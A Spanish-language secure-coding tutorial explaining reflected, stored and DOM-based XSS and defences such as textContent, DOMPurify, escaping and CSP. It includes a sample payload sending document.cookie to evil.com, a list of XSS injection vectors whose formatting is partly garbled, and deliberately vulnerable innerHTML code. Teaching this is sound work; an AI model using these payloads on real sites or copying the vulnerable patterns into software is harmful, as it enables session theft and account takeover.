# 01. XSS Attacks

**XSS (Cross-Site Scripting)** es una de las vulnerabilidades más comunes en aplicaciones web. Permite a un atacante
inyectar código JavaScript malicioso que se ejecuta en el navegador de otros usuarios.

---

## 1. Tipos de XSS

### Reflected XSS (Reflejado)

El código malicioso viene en la URL y se "refleja" inmediatamente en la respuesta.

```javascript
// URL: https://example.com/search?q=<script>alert('XSS')</script>

// Código vulnerable
const query = new URLSearchParams(window.location.search).get("q");
document.getElementById("results").innerHTML = `Resultados para: ${query}`;
// ❌ El script se ejecuta
```

### Stored XSS (Persistente)

El código malicioso se guarda en la base de datos y se ejecuta cada vez que se muestra.

```javascript
// Usuario malicioso envía un comentario:
// "<script>fetch('https://evil.com?cookie=' + document.cookie)</script>"

// Código vulnerable
comments.forEach((comment) => {
    div.innerHTML += `<p>${comment.text}</p>`; // ❌ XSS
});
```

### DOM-based XSS

La vulnerabilidad está en el código JavaScript del cliente, no en el servidor.

```javascript
// URL: https://example.com#<img src=x onerror=alert('XSS')>

// Código vulnerable
const hash = window.location.hash.substring(1);
document.getElementById("content").innerHTML = hash; // ❌ XSS
```

---

## 2. Vectores de Ataque

```javascript
// Diferentes formas de inyectar código
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS'
)>
<
svg
onload = alert('XSS') >
    < iframe
src = "javascript:alert('XSS')" >
    < a
href = "javascript:alert('XSS')" > Click < /a>
<input onfocus=alert('XSS'
)
autofocus >
```

---

## 3. Prevención

### Nunca Usar innerHTML con Datos del Usuario

```javascript
// ❌ MAL
element.innerHTML = userInput;

// ✅ BIEN
element.textContent = userInput;
```

### Sanitizar HTML con DOMPurify

```javascript
import DOMPurify from "dompurify";

// ✅ BIEN
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

### Escapar Datos en Templates

```javascript
// ✅ BIEN - Los frameworks modernos escapan automáticamente
// React
<div>{userInput}</div>

// Vue
<div>{{userInput}}</div>

// Vanilla JS
const escaped = userInput
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
```

---

## 4. Content Security Policy (CSP)

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
```

Esto bloquea scripts inline y solo permite scripts del mismo origen o con el nonce correcto.

---

## 5. Conclusión

**Regla de oro:** Nunca confíes en datos del usuario. Siempre sanitiza o escapa antes de renderizar.
